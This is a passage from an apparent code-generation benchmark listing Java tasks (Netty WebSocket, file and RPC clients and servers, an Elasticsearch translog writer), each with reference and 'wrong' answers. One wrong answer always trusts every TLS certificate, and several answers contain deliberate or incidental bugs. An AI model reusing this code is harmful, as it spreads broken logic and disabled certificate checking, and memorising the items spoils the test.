}\n\n        public Exception getException() {\n            return exception;\n        }\n\n        public String getMessage() {\n            return message;\n        }\n    }\n\n    public interface Callback<T> {\n        void onSuccess(T result);\n    }\n\n    public static class FutureResult<T> {\n        private T result;\n\n        public void setResult(T result) {\n            this.result = result;\n        }\n\n        public T getResult() {\n            return result;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 149,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client capable of establishing WebSocket connections with support for SSL/TLS, SOCKS proxy, message compression, and idle connection handling.\n\nClass Description: The NettyTcpClient class provides functionality to connect to a WebSocket server using Netty's asynchronous event-driven network framework. It handles connection establishment, SSL/TLS encryption, proxy configuration, message processing, and graceful shutdown.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- uri: URI - The target WebSocket server URI\n- webSocketChannel: Channel - The active WebSocket channel\n- eventLoopGroup: NioEventLoopGroup - Manages client-side I/O threads\n- compressedMessages: boolean - Flag for enabling message compression\n- acceptAllCertificates: boolean - Flag for accepting all SSL certificates\n- enableLoggingHandler: boolean - Flag for enabling Netty's logging handler\n- loggingHandlerLevel: LogLevel - Logging level for Netty's logging handler\n- socksProxyHost: String - SOCKS proxy host address\n- socksProxyPort: Integer - SOCKS proxy port number\n\nMethods:\n- connect(): void - Establishes a WebSocket connection to the specified URI with configured options\n- disconnect(): void - Closes the WebSocket connection and releases resources\n- getWebSocketClientExtensionHandler(): WebSocketClientExtensionHandler -> WebSocketClientExtensionHandler - Returns the WebSocket extension handler (defaults to compression handler)\n- getWebSocketClientHandler(WebSocketClientHandshaker, WebSocketClientHandler.WebSocketMessageHandler): WebSocketClientHandler -> WebSocketClientHandler - Creates and returns a custom WebSocket client handler with ping/pong and channel state management",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.codec.http.websocketx.extensions.WebSocketClientExtensionHandler;\nimport io.netty.handler.codec.http.websocketx.extensions.compression.WebSocketClientCompressionHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.proxy.Socks5ProxyHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.internal.SocketUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.URI;\nimport java.time.Duration;\n\npublic class NettyTcpClient {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyTcpClient.class);\n    private static final Duration DEFAULT_CONNECTION_TIMEOUT = Duration.ofSeconds(10);\n    private static final int DEFAULT_IDLE_TIMEOUT = 15;\n\n    private URI uri;\n    private Channel webSocketChannel;\n    private NioEventLoopGroup eventLoopGroup;\n    private boolean compressedMessages = false;\n    private boolean acceptAllCertificates = false;\n    private boolean enableLoggingHandler = false;\n    private LogLevel loggingHandlerLevel = LogLevel.DEBUG;\n    private String socksProxyHost;\n    private Integer socksProxyPort;\n\n    public void connect() {\n        try {\n            String scheme = uri.getScheme() == null ? \"ws\" : uri.getScheme();\n            String host = uri.getHost();\n            if (host == null) {\n                throw new IllegalArgumentException(\"Host cannot be null.\");\n            }\n\n            final int port = uri.getPort() == -1 ? \n                (\"ws\".equalsIgnoreCase(scheme) ? 80 : 443) : uri.getPort();\n\n            final boolean ssl = \"wss\".equalsIgnoreCase(scheme);\n            final SslContext sslCtx = ssl ? \n                SslContextBuilder.forClient()\n                    .trustManager(acceptAllCertificates ? InsecureTrustManagerFactory.INSTANCE : null)\n                    .build() : null;\n\n            WebSocketClientHandler handler = getWebSocketClientHandler(\n                WebSocketClientHandshakerFactory.newHandshaker(\n                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536),\n                message -> {});\n\n            if (eventLoopGroup == null || eventLoopGroup.isShutdown()) {\n                eventLoopGroup = new NioEventLoopGroup(2);\n            }\n\n            new Bootstrap()\n                .group(eventLoopGroup)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, \n                    (int) DEFAULT_CONNECTION_TIMEOUT.toMillis())\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        if (socksProxyHost != null) {\n                            p.addLast(new Socks5ProxyHandler(\n                                SocketUtils.socketAddress(socksProxyHost, socksProxyPort)));\n                        }\n                        if (sslCtx != null) {\n                            p.addLast(sslCtx.newHandler(ch.alloc(), host, port));\n                        }\n                        p.addLast(new HttpClientCodec());\n                        if (enableLoggingHandler) {\n                            p.addLast(new LoggingHandler(loggingHandlerLevel));\n                        }\n                        if (compressedMessages) {\n                            p.addLast(WebSocketClientCompressionHandler.INSTANCE);\n                        }\n                        p.addLast(new HttpObjectAggregator(8192));\n                        if (DEFAULT_IDLE_TIMEOUT > 0) {\n                            p.addLast(new IdleStateHandler(DEFAULT_IDLE_TIMEOUT, 0, 0));\n                        }\n                        WebSocketClientExtensionHandler clientExtensionHandler = \n                            getWebSocketClientExtensionHandler();\n                        if (clientExtensionHandler != null) {\n                            p.addLast(clientExtensionHandler);\n                        }\n                        p.addLast(handler);\n                    }\n                })\n                .connect(uri.getHost(), port)\n                .addListener((ChannelFuture channelFuture) -> {\n                    webSocketChannel = channelFuture.channel();\n                    if (!channelFuture.isSuccess()) {\n                        LOG.error(\"Connection failed\", channelFuture.cause());\n                    }\n                });\n        } catch (Exception e) {\n            LOG.error(\"Connection error\", e);\n        }\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null) {\n            webSocketChannel.close();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully(2, DEFAULT_IDLE_TIMEOUT, TimeUnit.SECONDS);\n        }\n    }\n\n    protected WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return WebSocketClientCompressionHandler.INSTANCE;\n    }\n\n    protected WebSocketClientHandler getWebSocketClientHandler(\n        WebSocketClientHandshaker handshaker,\n        WebSocketClientHandler.WebSocketMessageHandler handler) {\n        return new WebSocketClientHandler(handshaker, handler) {\n            @Override\n            public void channelInactive(ChannelHandlerContext ctx) {\n                LOG.info(\"Channel inactive\");\n                ctx.close();\n            }\n\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                if (evt instanceof IdleStateEvent) {\n                    IdleStateEvent e = (IdleStateEvent) evt;\n                    if (e.state() == IdleState.READER_IDLE) {\n                        ctx.writeAndFlush(new PingWebSocketFrame());\n                    }\n                }\n            }\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyTcpClient {\n    private static final Logger LOG = LoggerFactory.getLogger(NettyTcpClient.class);\n    private final URI uri;\n    private Channel webSocketChannel;\n    private final NioEventLoopGroup eventLoopGroup;\n    private boolean compressedMessages;\n    private boolean acceptAllCertificates;\n    private boolean enableLoggingHandler;\n    private LogLevel loggingHandlerLevel;\n    private String socksProxyHost;\n    private Integer socksProxyPort;\n\n    public NettyTcpClient(URI uri) {\n        this.uri = uri;\n        this.eventLoopGroup = new NioEventLoopGroup();\n    }\n\n    public void connect() {\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(eventLoopGroup)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n\n                            if (enableLoggingHandler) {\n                                pipeline.addLast(\"logging\", new LoggingHandler(loggingHandlerLevel));\n                            }\n\n                            if (socksProxyHost != null && socksProxyPort != null) {\n                                Socks5ProxyHandler proxyHandler = new Socks5ProxyHandler(new InetSocketAddress(socksProxyHost, socksProxyPort));\n                                pipeline.addLast(\"proxy\", proxyHandler);\n                            }\n\n                            if (uri.getScheme().equals(\"wss\")) {\n                                SSLContext sslContext = createSslContext();\n                                pipeline.addLast(\"ssl\", new SslHandler(sslContext.newEngine(ch.alloc())));\n                            }\n\n                            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                                    uri, WebSocketVersion.V13, null, false, new DefaultHttpHeaders());\n\n                            pipeline.addLast(\"ws\", getWebSocketClientHandler(handshaker, message -> {\n                                LOG.info(\"Received message: {}\", message);\n                            }));\n                        }\n                    });\n\n            webSocketChannel = bootstrap.connect(uri.getHost(), uri.getPort()).sync().channel();\n            LOG.info(\"Connected to WebSocket server at {}\", uri);\n        } catch (Exception e) {\n            LOG.error(\"Failed to connect to WebSocket server\", e);\n        }\n    }\n\n    private SSLContext createSslContext() throws Exception {\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {\n            public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n            public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n            public X509Certificate[] getAcceptedIssuers() {\n                return new X509Certificate[0];\n            }\n        }};\n        sslContext.init(null, trustAllCerts, new SecureRandom());\n        return sslContext;\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null) {\n            webSocketChannel.close().awaitUninterruptibly();\n            eventLoopGroup.shutdownGracefully().awaitUninterruptibly();\n            LOG.info(\"Disconnected from WebSocket server\");\n        }\n    }\n\n    public WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return compressedMessages ? new WebSocketClientCompressionHandler() : new WebSocketClientExtensionHandler();\n    }\n\n    public WebSocketClientHandler getWebSocketClientHandler(WebSocketClientHandshaker handshaker, WebSocketClientHandler.WebSocketMessageHandler messageHandler) {\n        return new WebSocketClientHandler(handshaker, messageHandler) {\n            @Override\n            public void channelActive(ChannelHandlerContext ctx) {\n                handshaker.handshake(ctx.channel());\n            }\n\n            @Override\n            public void channelInactive(ChannelHandlerContext ctx) {\n                LOG.info(\"WebSocket connection closed\");\n            }\n\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                if (evt instanceof IdleStateEvent) {\n                    IdleStateEvent e = (IdleStateEvent) evt;\n                    if (e.state() == IdleState.WRITER_IDLE) {\n                        ctx.writeAndFlush(new PingWebSocketFrame());\n                    }\n                }\n                super.userEventTriggered(ctx, evt);\n            }\n        };\n    }\n\n    public void setCompressedMessages(boolean compressedMessages) {\n        this.compressedMessages = compressedMessages;\n    }\n\n    public void setAcceptAllCertificates(boolean acceptAllCertificates) {\n        this.acceptAllCertificates = acceptAllCertificates;\n    }\n\n    public void setEnableLoggingHandler(boolean enableLoggingHandler) {\n        this.enableLoggingHandler = enableLoggingHandler;\n    }\n\n    public void setLoggingHandlerLevel(LogLevel loggingHandlerLevel) {\n        this.loggingHandlerLevel = loggingHandlerLevel;\n    }\n\n    public void setSocksProxyHost(String socksProxyHost) {\n        this.socksProxyHost = socksProxyHost;\n    }\n\n    public void setSocksProxyPort(Integer socksProxyPort) {\n        this.socksProxyPort = socksProxyPort;\n    }\n}"
  },
  {
    "Task_id": 154,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, send messages from standard input, and handle file operations.\n\nClass Description: The FileClient class establishes a TCP connection to a specified host and port using Netty's non-blocking I/O. It configures the client pipeline with string encoders/decoders and a custom handler for file operations. The client continuously reads input from the console and sends it to the server.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server\ndest: String - The destination path for file operations (used by the client handler)\n\nMethods:\nrun(): void - throws InterruptedException, IOException - Main method that initializes the Netty client, establishes connection, and handles message sending\n  - Input: None\n  - Output: None (but may throw InterruptedException or IOException)\n  \nFileClient(String, int, String) - Constructor that initializes the client with connection parameters\n  - Input:\n    - host: String - Server hostname/IP\n    - port: int - Server port\n    - dest: String - File destination path\n  - Output: FileClient instance (constructor)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class FileClient {\n\n    private String host;\n    private int port;\n    private String dest;\n\n    public FileClient(String host, int port, String dest) {\n        this.host = host;\n        this.port = port;\n        this.dest = dest;\n    }\n\n    public void run() throws InterruptedException, IOException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"encoder\", new StringEncoder(CharsetUtil.UTF_8));\n                    ch.pipeline().addLast(\"decoder\", new StringDecoder(CharsetUtil.UTF_8));\n                    ch.pipeline().addLast(new FileClientHandler(dest));\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            Channel channel = f.channel();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                channel.writeAndFlush(in.readLine() + \"\\r\\n\");\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class FileClient {\n    private final String host;\n    private final int port;\n    private final String dest;\n\n    public FileClient(String host, int port, String dest) {\n        this.host = host;\n        this.port = port;\n        this.dest = dest;\n    }\n\n    public void run() throws InterruptedException, IOException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new StringEncoder());\n                            pipeline.addLast(new StringDecoder());\n                            pipeline.addLast(new FileClientHandler(dest));\n                        }\n                    });\n\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            String line;\n            while ((line = in.readLine()) != null) {\n                channel.writeAndFlush(line + \"\\n\");\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length < 3) {\n            System.err.println(\"Usage: FileClient <host> <port> <dest>\");\n            return;\n        }\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n        String dest = args[2];\n        new FileClient(host, port, dest).run();\n    }\n}"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Create a Java class that implements a transactional log writer for Elasticsearch, handling file operations using Java NIO's FileChannel for efficient I/O operations. The class should manage writing operations, buffer management, and resource cleanup.\n\nClass Description: TranslogWriter is a transactional log writer that extends BaseTranslogReader and implements Closeable. It provides functionality to write operations to a log file using FileChannel, manage buffers, and handle synchronization. The class includes mechanisms for checkpointing, thread-safe operations, and resource management.\n\nAttributes:\n- channel: [FileChannel] - The main file channel for writing transaction log entries\n- checkpointChannel: [FileChannel] - File channel for writing checkpoint information\n- checkpointPath: [Path] - Path to the checkpoint file\n- bigArrays: [BigArrays] - Helper for managing large arrays\n- totalOffset: [long] - Current offset in the log file\n- closed: [AtomicBoolean] - Flag indicating whether the writer is closed\n- writeLock: [ReleasableLock] - Lock for thread-safe write operations\n- syncLock: [Object] - Synchronization lock object\n- buffer: [ReleasableBytesStreamOutput] - Buffer for holding data before writing\n- globalCheckpointSupplier: [LongSupplier] - Supplier for global checkpoint information\n- minTranslogGenerationSupplier: [LongSupplier] - Supplier for minimum translog generation\n- persistedSequenceNumberConsumer: [LongConsumer] - Consumer for persisted sequence numbers\n\nMethods:\n- TranslogWriter([ShardId, Checkpoint, FileChannel, FileChannel, Path, Path, ByteSizeValue, LongSupplier, LongSupplier, TranslogHeader, TragicExceptionHolder, LongConsumer, BigArrays]) -> [void] - Constructor that initializes the translog writer with all required components\n- writeAndReleaseOps([ReleasableBytesReference]) -> [void] - Writes the given bytes reference to the file and releases it\n- writeToFile([ByteBuffer]) -> [void] - Helper method that writes buffer contents to the file channel\n- readBytes([ByteBuffer, long]) -> [void] - Reads bytes from the specified position into the target buffer\n- writeCheckpoint([FileChannel, Path, Checkpoint]) -> [void] - Static helper method to write checkpoint information\n- close() -> [void] - Closes all resources and marks the writer as closed",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.function.LongConsumer;\nimport java.util.function.LongSupplier;\n\nimport org.apache.lucene.store.AlreadyClosedException;\nimport org.apache.lucene.util.BytesRef;\nimport org.apache.lucene.util.BytesRefIterator;\nimport org.elasticsearch.common.bytes.BytesArray;\nimport org.elasticsearch.common.bytes.BytesReference;\nimport org.elasticsearch.common.bytes.ReleasableBytesReference;\nimport org.elasticsearch.common.io.Channels;\nimport org.elasticsearch.common.io.DiskIoBufferPool;\nimport org.elasticsearch.common.lease.Releasables;\nimport org.elasticsearch.common.unit.ByteSizeValue;\nimport org.elasticsearch.common.util.BigArrays;\nimport org.elasticsearch.common.util.concurrent.ReleasableLock;\nimport org.elasticsearch.index.seqno.SequenceNumbers;\nimport org.elasticsearch.index.shard.ShardId;\n\nimport io.crate.common.SuppressForbidden;\nimport io.crate.common.io.IOUtils;\n\npublic class TranslogWriter extends BaseTranslogReader implements Closeable {\n\n    private final FileChannel channel;\n    private final FileChannel checkpointChannel;\n    private final Path checkpointPath;\n    private final BigArrays bigArrays;\n    private volatile long totalOffset;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n    private final ReleasableLock writeLock = new ReleasableLock(new ReentrantLock());\n    private final Object syncLock = new Object();\n    private ReleasableBytesStreamOutput buffer;\n    private final LongSupplier globalCheckpointSupplier;\n    private final LongSupplier minTranslogGenerationSupplier;\n    private final LongConsumer persistedSequenceNumberConsumer;\n\n    public TranslogWriter(\n        final ShardId shardId,\n        final Checkpoint initialCheckpoint,\n        final FileChannel channel,\n        final FileChannel checkpointChannel,\n        final Path path,\n        final Path checkpointPath,\n        final ByteSizeValue bufferSize,\n        final LongSupplier globalCheckpointSupplier,\n        LongSupplier minTranslogGenerationSupplier,\n        TranslogHeader header,\n        final TragicExceptionHolder tragedy,\n        final LongConsumer persistedSequenceNumberConsumer,\n        final BigArrays bigArrays) throws IOException {\n        super(initialCheckpoint.generation, channel, path, header);\n        this.channel = channel;\n        this.checkpointChannel = checkpointChannel;\n        this.checkpointPath = checkpointPath;\n        this.bigArrays = bigArrays;\n        this.totalOffset = initialCheckpoint.offset;\n        this.globalCheckpointSupplier = globalCheckpointSupplier;\n        this.minTranslogGenerationSupplier = minTranslogGenerationSupplier;\n        this.persistedSequenceNumberConsumer = persistedSequenceNumberConsumer;\n    }\n\n    private void writeAndReleaseOps(ReleasableBytesReference toWrite) throws IOException {\n        try (ReleasableBytesReference toClose = toWrite) {\n            assert writeLock.isHeldByCurrentThread();\n            ByteBuffer ioBuffer = DiskIoBufferPool.getIoBuffer();\n\n            BytesRefIterator iterator = toWrite.iterator();\n            BytesRef current;\n            while ((current = iterator.next()) != null) {\n                int currentBytesConsumed = 0;\n                while (currentBytesConsumed != current.length) {\n                    int nBytesToWrite = Math.min(current.length - currentBytesConsumed, ioBuffer.remaining());\n                    ioBuffer.put(current.bytes, current.offset + currentBytesConsumed, nBytesToWrite);\n                    currentBytesConsumed += nBytesToWrite;\n                    if (ioBuffer.hasRemaining() == false) {\n                        ioBuffer.flip();\n                        writeToFile(ioBuffer);\n                        ioBuffer.clear();\n                    }\n                }\n            }\n            ioBuffer.flip();\n            writeToFile(ioBuffer);\n        }\n    }\n\n    @SuppressForbidden(reason = \"Channel#write\")\n    private void writeToFile(ByteBuffer ioBuffer) throws IOException {\n        while (ioBuffer.remaining() > 0) {\n            channel.write(ioBuffer);\n        }\n    }\n\n    @Override\n    protected void readBytes(ByteBuffer targetBuffer, long position) throws IOException {\n        try {\n            if (position + targetBuffer.remaining() > getWrittenOffset()) {\n                writeBufferedOps(position + targetBuffer.remaining(), true);\n            }\n        } catch (final Exception ex) {\n            closeWithTragicEvent(ex);\n            throw ex;\n        }\n        Channels.readFromFileChannelWithEofException(channel, position, targetBuffer);\n    }\n\n    private static void writeCheckpoint(\n        final FileChannel fileChannel,\n        final Path checkpointFile,\n        final Checkpoint checkpoint) throws IOException {\n        Checkpoint.write(fileChannel, checkpointFile, checkpoint);\n    }\n\n    @Override\n    public final void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            synchronized (this) {\n                Releasables.closeIgnoringException(buffer);\n                buffer = null;\n            }\n            IOUtils.close(checkpointChannel, channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.function.LongConsumer;\nimport java.util.function.LongSupplier;\n\npublic class TranslogWriter extends BaseTranslogReader implements Closeable {\n    private final FileChannel channel;\n    private final FileChannel checkpointChannel;\n    private final Path checkpointPath;\n    private final BigArrays bigArrays;\n    private long totalOffset;\n    private final AtomicBoolean closed;\n    private final ReleasableLock writeLock;\n    private final Object syncLock;\n    private final ReleasableBytesStreamOutput buffer;\n    private final LongSupplier globalCheckpointSupplier;\n    private final LongSupplier minTranslogGenerationSupplier;\n    private final LongConsumer persistedSequenceNumberConsumer;\n\n    public TranslogWriter(ShardId shardId, Checkpoint checkpoint, FileChannel channel, FileChannel checkpointChannel, Path path, Path checkpointPath, ByteSizeValue bufferSize, LongSupplier globalCheckpointSupplier, LongSupplier minTranslogGenerationSupplier, TranslogHeader header, TragicExceptionHolder exceptionHolder, LongConsumer persistedSequenceNumberConsumer, BigArrays bigArrays) {\n        super(shardId, path, bufferSize, header, exceptionHolder);\n        this.channel = channel;\n        this.checkpointChannel = checkpointChannel;\n        this.checkpointPath = checkpointPath;\n        this.bigArrays = bigArrays;\n        this.totalOffset = checkpoint.getOffset();\n        this.closed = new AtomicBoolean(false);\n        this.writeLock = new ReleasableLock();\n        this.syncLock = new Object();\n        this.buffer = new ReleasableBytesStreamOutput(bufferSize.getBytes());\n        this.globalCheckpointSupplier = globalCheckpointSupplier;\n        this.minTranslogGenerationSupplier = minTranslogGenerationSupplier;\n        this.persistedSequenceNumberConsumer = persistedSequenceNumberConsumer;\n    }\n\n    public void writeAndReleaseOps(ReleasableBytesReference bytesReference) throws IOException {\n        try (ReleasableBytesReference ignored = bytesReference) {\n            ByteBuffer buffer = bytesReference.byteBuffer();\n            writeToFile(buffer);\n        }\n    }\n\n    private void writeToFile(ByteBuffer buffer) throws IOException {\n        if (closed.get()) {\n            throw new IOException(\"TranslogWriter is closed\");\n        }\n        writeLock.acquire();\n        try {\n            int remaining = buffer.remaining();\n            if (remaining > 0) {\n                buffer.flip();\n                while (buffer.hasRemaining()) {\n                    int written = channel.write(buffer);\n                    if (written == 0) {\n                        break;\n                    }\n                }\n                buffer.compact();\n                totalOffset += buffer.position();\n                buffer.clear();\n            }\n        } finally {\n            writeLock.release();\n        }\n    }\n\n    @Override\n    public void readBytes(ByteBuffer target, long offset) throws IOException {\n        if (closed.get()) {\n            throw new IOException(\"TranslogWriter is closed\");\n        }\n        channel.read(target, offset);\n    }\n\n    public static void writeCheckpoint(FileChannel channel, Path path, Checkpoint checkpoint) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        buffer.putLong(checkpoint.getOffset());\n        buffer.putLong(checkpoint.getGlobalCheckpoint());\n        buffer.putLong(checkpoint.getMinTranslogGeneration());\n        buffer.flip();\n        channel.write(buffer, 0);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            try {\n                writeLock.close();\n            } finally {\n                try {\n                    channel.close();\n                } finally {\n                    try {\n                        checkpointChannel.close();\n                    } finally {\n                        buffer.close();\n                    }\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 162,
    "Instruction": "Task Description: Implement a Netty-based TCP server for RPC (Remote Procedure Call) communication that handles incoming client connections, processes RPC requests, and manages server resources efficiently.\n\nClass Description: NettyRpcServer is a Spring component that establishes a TCP server using Netty framework to handle RPC communications. It manages service registration, client connections, and provides graceful shutdown capabilities.\n\nAttributes:\n- PORT: [int] - The port number on which the server listens for incoming connections (default: 9998).\n- serviceProvider: [ServiceProvider] - An instance responsible for managing and providing registered RPC services (singleton instance of ZkServiceProviderImpl).\n\nMethods:\n- start(): [void] - Initializes and starts the Netty TCP server. Configures event loop groups, server bootstrap, channel pipeline with handlers for encoding/decoding RPC messages, and idle state detection. Binds to the specified host and port, and keeps the server running until shutdown.\n  Input: None\n  Output: None\n\n- registerService(RpcServiceConfig rpcServiceConfig): [void] - Registers an RPC service with the service provider.\n  Input: rpcServiceConfig [RpcServiceConfig] - Configuration object containing RPC service details to be registered.\n  Output: None",
    "Canonical_solution": "import github.javaguide.config.CustomShutdownHook;\nimport github.javaguide.config.RpcServiceConfig;\nimport github.javaguide.factory.SingletonFactory;\nimport github.javaguide.provider.ServiceProvider;\nimport github.javaguide.provider.impl.ZkServiceProviderImpl;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageDecoder;\nimport github.javaguide.remoting.transport.netty.codec.RpcMessageEncoder;\nimport github.javaguide.utils.RuntimeUtil;\nimport github.javaguide.utils.concurrent.threadpool.ThreadPoolFactoryUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultEventExecutorGroup;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport java.net.InetAddress;\nimport java.util.concurrent.TimeUnit;\n\n@Slf4j\n@Component\npublic class NettyRpcServer {\n\n    public static final int PORT = 9998;\n\n    private final ServiceProvider serviceProvider = SingletonFactory.getInstance(ZkServiceProviderImpl.class);\n\n    @SneakyThrows\n    public void start() {\n        CustomShutdownHook.getCustomShutdownHook().clearAll();\n        String host = InetAddress.getLocalHost().getHostAddress();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        DefaultEventExecutorGroup serviceHandlerGroup = new DefaultEventExecutorGroup(\n                RuntimeUtil.cpus() * 2,\n                ThreadPoolFactoryUtil.createThreadFactory(\"service-handler-group\", false)\n        );\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childOption(ChannelOption.TCP_NODELAY, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .handler(new LoggingHandler(LogLevel.INFO))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline p = ch.pipeline();\n                            p.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));\n                            p.addLast(new RpcMessageEncoder());\n                            p.addLast(new RpcMessageDecoder());\n                            p.addLast(serviceHandlerGroup, new NettyRpcServerHandler());\n                        }\n                    });\n\n            ChannelFuture f = b.bind(host, PORT).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            log.error(\"occur exception when start server:\", e);\n        } finally {\n            log.error(\"shutdown bossGroup and workerGroup\");\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n            serviceHandlerGroup.shutdownGracefully();\n        }\n    }\n\n    public void registerService(RpcServiceConfig rpcServiceConfig) {\n        serviceProvider.publishService(rpcServiceConfig);\n    }\n}",
    "Code_level": "Class-level",
